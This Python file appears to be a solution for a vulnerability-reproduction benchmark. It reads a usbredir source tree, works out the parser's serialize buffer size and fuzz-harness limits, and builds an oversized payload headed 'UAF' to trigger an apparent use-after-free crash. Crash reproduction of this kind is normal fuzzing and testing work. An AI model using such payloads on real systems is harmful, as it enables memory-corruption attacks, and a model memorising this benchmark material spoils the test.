import os
import re
import tarfile
import ast
from typing import Iterator, Optional, Tuple


def _safe_eval_c_int_expr(expr: str) -> Optional[int]:
    if not expr:
        return None
    s = expr.strip()
    s = re.sub(r'//.*', '', s)
    s = re.sub(r'/\*.*?\*/', '', s, flags=re.S)
    s = s.strip()
    s = re.sub(r'\b([0-9]+)([uUlL]+)\b', r'\1', s)
    s = re.sub(r'\b(0x[0-9a-fA-F]+)([uUlL]+)\b', r'\1', s)
    if not re.fullmatch(r'[0-9a-fA-FxX\(\)\s\+\-\*\/%<>&\|\^~]+', s):
        return None

    try:
        node = ast.parse(s, mode="eval")
    except Exception:
        return None

    def ev(n):
        if isinstance(n, ast.Expression):
            return ev(n.body)
        if isinstance(n, ast.Constant) and isinstance(n.value, int):
            return int(n.value)
        if isinstance(n, ast.UnaryOp):
            v = ev(n.operand)
            if v is None:
                return None
            if isinstance(n.op, ast.UAdd):
                return +v
            if isinstance(n.op, ast.USub):
                return -v
            if isinstance(n.op, ast.Invert):
                return ~v
            return None
        if isinstance(n, ast.BinOp):
            a = ev(n.left)
            b = ev(n.right)
            if a is None or b is None:
                return None
            op = n.op
            if isinstance(op, ast.Add):
                return a + b
            if isinstance(op, ast.Sub):
                return a - b
            if isinstance(op, ast.Mult):
                return a * b
            if isinstance(op, ast.FloorDiv) or isinstance(op, ast.Div):
                if b == 0:
                    return None
                return a // b
            if isinstance(op, ast.Mod):
                if b == 0:
                    return None
                return a % b
            if isinstance(op, ast.LShift):
                if b < 0 or b > 63:
                    return None
                return a << b
            if isinstance(op, ast.RShift):
                if b < 0 or b > 63:
                    return None
                return a >> b
            if isinstance(op, ast.BitOr):
                return a | b
            if isinstance(op, ast.BitAnd):
                return a & b
            if isinstance(op, ast.BitXor):
                return a ^ b
            return None
        return None

    v = ev(node)
    if v is None:
        return None
    if v < 0:
        return None
    return int(v)


def _iter_tar_text_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    with tarfile.open(src_path, mode="r:*") as tf:
        for m in tf.getmembers():
            if not m.isfile():
                continue
            name = m.name
            if not name.endswith((".c", ".cc", ".cpp", ".h", ".hh", ".hpp")):
                continue
            if m.size <= 0 or m.size > 3_000_000:
                continue
            f = tf.extractfile(m)
            if f is None:
                continue
            try:
                data = f.read()
            except Exception:
                continue
            yield name, data


def _iter_dir_text_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    for root, _, files in os.walk(src_path):
        for fn in files:
            if not fn.endswith((".c", ".cc", ".cpp", ".h", ".hh", ".hpp")):
                continue
            p = os.path.join(root, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > 3_000_000:
                continue
            try:
                with open(p, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            rel = os.path.relpath(p, src_path)
            yield rel, data


def _iter_text_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_dir_text_files(src_path)
    else:
        yield from _iter_tar_text_files(src_path)


def _extract_serialize_buf_size(src_path: str) -> int:
    pattern = re.compile(rb'^\s*#\s*define\s+USBREDIRPARSER_SERIALIZE_BUF_SIZE\s+(.+?)\s*$', re.M)
    candidates = []
    for name, data in _iter_text_files(src_path):
        if b"USBREDIRPARSER_SERIALIZE_BUF_SIZE" not in data:
            continue
        for m in pattern.finditer(data):
            expr = m.group(1).decode("latin1", "ignore")
            val = _safe_eval_c_int_expr(expr)
            if val is not None and 1024 <= val <= 16 * 1024 * 1024:
                candidates.append(val)
        if candidates:
            break
    if candidates:
        return max(candidates)
    return 65536


def _find_harness_snippet(src_path: str) -> str:
    best = ""
    best_score = -1
    for name, data in _iter_text_files(src_path):
        if b"usbredirparser" not in data:
            continue
        score = 0
        if b"LLVMFuzzerTestOneInput" in data:
            score += 10
        if b"usbredirparser_serialize" in data:
            score += 7
        if b"usbredirparser_unserialize" in data:
            score += 4
        if b"usbredirparser_write" in data:
            score += 5
        if score > best_score:
            best_score = score
            best = data.decode("latin1", "ignore")
    return best


class Solution:
    def solve(self, src_path: str) -> bytes:
        buf_size = _extract_serialize_buf_size(src_path)
        harness = _find_harness_snippet(src_path)

        extra = 2048
        if harness:
            if "usbredirparser_write" in harness and "usbredirparser_serialize" in harness:
                extra = 512
            elif "usbredirparser_unserialize" in harness and "usbredirparser_serialize" in harness:
                extra = 4096
            elif "LLVMFuzzerTestOneInput" in harness:
                extra = 1024

            m = re.search(r'if\s*\(\s*size\s*>\s*([0-9xXa-fA-F\(\)\s\+\-\*\/%<>&\|\^~]+)\s*\)\s*size\s*=\s*\1\s*;', harness)
            if m:
                lim = _safe_eval_c_int_expr(m.group(1))
                if lim is not None and lim > 0:
                    if lim <= buf_size + extra:
                        extra = max(256, lim - buf_size + 128)

        target_len = buf_size + extra
        if target_len < 66000:
            target_len = 66000

        payload = bytearray(target_len)
        payload[0:16] = b"\x01UAF\x00" + b"\x00" * 11
        for i in range(16, target_len):
            payload[i] = 0x41
        return bytes(payload)